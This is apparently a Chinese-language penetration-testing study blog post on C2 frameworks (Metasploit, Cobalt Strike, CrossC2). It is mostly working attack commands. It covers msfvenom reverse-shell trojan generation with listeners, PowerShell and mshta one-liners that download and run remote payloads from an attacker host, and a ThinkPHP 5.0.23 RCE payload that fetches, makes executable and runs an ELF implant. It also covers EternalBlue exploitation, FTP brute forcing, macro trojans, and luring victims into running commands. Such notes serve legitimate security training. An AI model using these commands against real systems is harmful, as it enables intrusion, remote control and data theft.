---
title: "C2 工具"
permalink: c2-frameworks/
date: 2026-01-19 10:38:27
categories:
  - 网络安全
  - 内网渗透
tags:
  - C2
  - Cobalt Strike
  - 远控
img: /medias/featureimages/10.jpg
summary: "Cobalt Strike、Metasploit、Sliver 等常见 C2 框架的功能、上线流程与流量特征认知。"
---

<!-- more -->

## metasploit
## 简介
 官网：  [https://www.metasploit.com/](https://www.metasploit.com/)

 所属企业：  [https://www.rapid7.com/](https://www.rapid7.com/)

c2工具，简称 msf，kali自带，windows 和 云服务器均可安装

## 功能

1. msfconsole：metasploit 的命令行终端
2. msfvenom：metasploit 生成 payload 及可执行程序木马的工具
3. modules：保存了 metasploit 支持的所有模块

+ auxiliary 辅助模块 （信息收集、端口扫描、服务爆破、漏洞检测）
+ exploits 漏洞利用
+ payloads 攻击载荷
+ post 后渗透 （代理隧道、横向渗透、 权限维持、提权、内网信息收集 、 痕迹清除等）
+ encoders 编码器 / evasion 逃避 / nops 空 （绕过杀毒软件 、绕过edr）

## 安装
### kali自带

### Linux 云服务器 安装
`curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall`

### windows 系统安装
 `https://windows.metasploit.com/metasploitframework-latest.msi  `

## msfconsole使用
## 步骤
+ **使用模块 [use] ( 使用模块之前一般需要搜索[search]模块  )**
+ **配置模块 [set] ( 配置模块之前一般需要查看[show]配置项  )**
+ **运行模块 [run]**

## 举例 1 : 端口扫描  **portscan**
### 1  搜索模块
`**search   portscan**`

### 2  使用模块
`use   模块的ID`或  `use   模块的全名`

### 3  查看配置项
`show   options   show 可以不写`

### 4  根据实际需求配置选项
 `set    选项名    选项值  `

⚠️选项名大小写不敏感，可以使用 `**TAB**` 补全

### 5  运行模块

## 举例 2 ：内网存活探测  `arp  sweep`
 先搜索、再使用

`search  arp  sweep`

 查看配置、设置选项

 运行模块

## 举例 3 ：爆破 ftp
先搜索，再使用

`search  ftp  login`

 设置选项

`python -m pyftpdlib -p 21 -u sd -P 123456`

 运行模块

##  举例 4：攻击 thinkphp
 搜索并使用

`search  thinkphp`

 重要配置项

运行模块 ，如果攻击成功，会进入 `**meterpreter**` 命令终端

##  举例 5 ：攻击永恒之蓝漏洞
搜索并使用

`search  ms17_010`

设置选项

运行模块 ，如果攻击成功，会进入 `**meterpreter**` 命令终端

##  举例 6： web_delivery
 **无文件落地**，类似于之前说的 powershell **远程加载执行脚本**

`**powershell -ep bypass -c "iex (new-object system.net.webclient).downloadstring('ps1文件的下载网址');脚本运行的方法"**`

`search  web_delivery`

### python
设置配置

运行后，就会生成一个（python）命令，诱导受害者运行命令（或通过 rce 漏洞执行命令）

受害者运行链接

攻击者即可收到 `meterpreter` （默认放在后台），需要使用 `sessions` 打开后台才能看到

### powershell
`show  targets`

目标没有python，可以选其他语言

设置 target 为其他脚本

`set target  ID`

 需要替换payload

`set payload windows/x64/meterpreter/reverse_tcp`

#### jobs 查看放在后台的监听
可以使用 `jobs` 查看放在后台的监听，使用` jobs -K` 能 够删除放在后台的所有监听

 运行后会出现 `powershell` 命令。目标执行即可上线` meterpreter session`

#### sessions 可以看到放在后台的会话
sessions 会话ID 可进入后台的会话 ， bg 可以把当前的会话放在后台

## meterpreter
msf 的后渗透命令行，常见功能

```plain
help          查看帮助信息
bg            放在后台
exit          退出
cat           查看文件
cp            复制
upload        上传文件
download      下载文件
arp           查看arp缓存
ifconfig      查看ip
clearev       清除日志
execute       执行系统命令
getenv        查看环境变量
getprivs      查看目标权限
getuid        获取当前用户
sysinfo       查看目标系统
screenshot    截图
webcam_snap   拍照
shell         打开目标命令行
```

+ 乱码的原因：cmd 默认是 gbk 编码，而 bash 默认是 utf-8
+ 修复乱码：cmd 中执行命令 `chcp 65001 `

`chcp 936`

##  msfvenom
##  生成 windows 木马
`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=攻击机ip lport=攻击机端口 -f exe -o 文件名.exe  `

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.153 lport=7586 -f exe -o 123.exe`

+  -p payload
+ -f 格式
+ -o 输出的文件名

### msfconsole 开监听
`handler -p 上面生成时用的payload -H 上面生成时用的ip -P 上面生成时用的端口 `

`handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586`

###  上线
 受害者运行 exe，即可上线 `meterpreter  `

##  生成 linux 木马
`msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.2.153 lport=7586 -f elf -o 123.elf `

 一样的开启监听，受害者运行 elf 即可

`handler -p  linux/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586`

`chmod +x 123.elf`

`./123.elf`

##  staged payload 和 stageless payload
查看 msfvenom 支持哪些 payload

 `msfvenom --list payloads`

+ **windows/x64/meterpreter/reverse_tcp**（staged payload 分段式 payload）
+ **windows/x64/meterpreter_reverse_tcp** （stageless payload 无分段 payload ）

### 区别：
+  分段式的木马，是一个下载器，上线时需下载 stage 到内存中
+  无分段的木马，是一个完整的木马

`**handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586 **`

`**handler -p  windows/x64/meterpreter_reverse_tcp -H 192.168.2.153 -P 7585 **`

## 操作：RCE 漏洞 meterpreter
`https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md`

### 1  攻击机生成 elf 木马
`msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.2.153 lport=7586 -f elf -o 123.elf`

### 2  攻击机开启监听
`handler -p  linux/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586`

### 3  攻击机开http下载链接
`python -m http.server`

### 4  攻击漏洞 （ thinkphp 5.0.23 rce ）
`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl http://192.168.79.120:8000/123.elf -o /tmp/123.elf`

`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=chmod 777 /tmp/123.elf`

`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=/tmp/123.elf`

### 5 上线

## CobalStrike
cs 也是 c2工具，基于图形化界面，有客户端和服务器两部分组成

## Server 服务端
有java 的设备上即可运行，默认端口 **50050**

`**./teamserver 192.168.2.153 123456**`

`**如果想修改端口，直接编辑 teamserver 文件即可  **`

## Client 客户端
有java 的设备上即可运行  （**不行的话 切换 jdk 版本**）

## Listenter 监听器

## Payload 生成木马文件
### stager payload / stageless payload

`stager payload`

`stageless payload`

### HTML application
#### `HTA 是windows html的`
#### `一种应用程序`
#### `支持在 hta 里封装 vbs 脚本`
#### `vbs 脚本再触发 powershell `

 cobaltstrike 中 类似 `**python -m http.server **`的功能 `**Host File**  `

 **复制链接**

`http://192.168.2.153:80/han`

如果忘记复制链接，可以到 Manage 里重新复制

`mshta 复制的拦截  `

`mshta http://192.168.2.153:80/han`

### web delivery

`复制链接并在靶机(cmd 上)执行即可上线 beacon  `

`powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.2.153:1245/hansdxx'))"`

### office 宏木马
**windows office 支持宏脚本，宏脚本 vbs ，vbs 可以嵌套powershell**

**跟着步骤操作**

`受害者打开 docm 文件，即可上线  `

#### beacon
`双击exe即可上线 beacon  `

#### interact  执行系统命令
```plain
shell   系统命令
shell   whoami
shell   dir
shell   net  user
```

#### sleep
**默认 sleep 的时间是  1 min**

**修改 sleep 的时间**

```plain
sleep  秒数
sleep  1
sleep  0
```

#### 文件浏览器

####  进程列表

####  屏幕截图

####  vnc

#####  只读模式

#####  控制模式

#### 退出和删除

## cobaltstrike 和 meterpreter
### `msf meterpreter 转 cs beacon`
#### 1 上线 `meterpreter`
**msfvenom 生成木马 -> msfconsole handler 开启监听 -> 双击木马上线**

#### 2 CS创建HTTP监听器

#### 3 msfconsole使用模块exploit
#### /windows/local/payload_inject
`set payload windows/meterpreter/reverse_http`

`set lhost 192.168.2.153`

`set lport 1234`

`set disablepayloadhandler true`

#### 4 cs 即可收到 beacon

### cs beacon 转 msf meterpreter
#### 1  上线 beacon

#### 2  msfconsole 开启监听
⚠️  **-H 需要是 msf 的ip地址 -P 随机**

`handler -p  windows/meterpreter/reverse_http -H 192.168.2.169 -P 2456`

#### 3  cs 创建外部监听器

#### 4  选择要发送的 beacon，
####  spawn 并选择刚刚的外部监听器

#### 5  msf 收到 meterpreter

⚠️  x86 的 meterpreter 用在 x64 的系统中，大部分的功能都可以正常使用 （有部分功能用不 了），如果想变为 x64 的 meterpreter ，可以进行进程迁移

`sessions   -u   会话的ID`

 新上线的meterpreter就是 x64 的了

## CNA 插件
###  综合渗透插件 `LSTAR`
 `https://github.com/lintstar/LSTAR  `

`-Dfile.encoding=UTF-8`

### CrossC2
####  简介
##### 让 cs 支持 linux 、macos 攻击

#### 1 安装编辑
⚠️  编辑 CrossC2-GithubBot-2023-11-20.cna

`**$CC2_PATH = "D:\\32550\\aq\\CobaltStrike4.8\\genCrossC2.Win\\"; # <-------- fix**`

`**$CC2_BIN = "genCrossC2.exe";**`

改动CC2_PATH 为 genCrossC2.exe所在的绝对路径

改动 CC2_BIN 为 genCrossC2.exe

#### 2 依次导入
`CrossC2-GithubBot-2023-11-20.cna`

`CrossC2Kit.cna`

`CrossC2Kit_Loader.cna`

#### 3  把 teamserver 上的 隐藏文件
#### .cobaltstrike.beacon_keys
####  传输到 cobaltstrike 客户端文件夹中

### 使用 （生成linux木马并上线）
#### 1  cs 中创建一个 https 的监听器

#### 2  使用 crossC2 生成木马

####  生成的木马保存位置在
#### cobaltstrike 的客户端文件夹中

#### 3  把 elf 木马传给 linux 靶机
#### 并运行，即可上线 linux beacon
